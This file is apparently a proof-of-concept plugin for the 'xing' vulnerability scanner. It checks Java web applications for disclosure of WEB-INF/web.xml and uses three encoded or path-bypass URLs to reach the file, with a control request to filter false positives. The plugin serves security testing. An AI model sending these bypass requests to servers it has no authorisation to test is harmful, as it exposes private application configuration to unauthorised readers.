from xing.core.BasePlugin import BasePlugin
from xing.utils import http_req
from xing.core import PluginType, SchemeType


class Plugin(BasePlugin):
    def __init__(self):
        super(Plugin, self).__init__()
        self.plugin_type = PluginType.POC
        self.vul_name = "WEB-INF/web.xml 文件泄漏"
        self.app_name = 'Java'
        self.scheme = [SchemeType.HTTP, SchemeType.HTTPS]

    def verify(self, target):
        check = b"</web-app>"
        paths = ["/%2e/WEB-INF/web.xml", "/WEB-INF/web.xml.", "/static?/%2557EB-INF/web.xml"]

        for path in paths:
            url = target + path
            conn = http_req(url, disable_normal=True)
            if conn.status_code != 200:
                continue

            if check not in conn.content:
                continue

            url_404 = target + path.replace("web", "web_not")
            conn_404 = http_req(url_404, disable_normal=True)
            if check not in conn_404.content:
                self.logger.success("发现 WEB-INF/web.xml 文件泄漏 vuln {}".format(url))
                return url

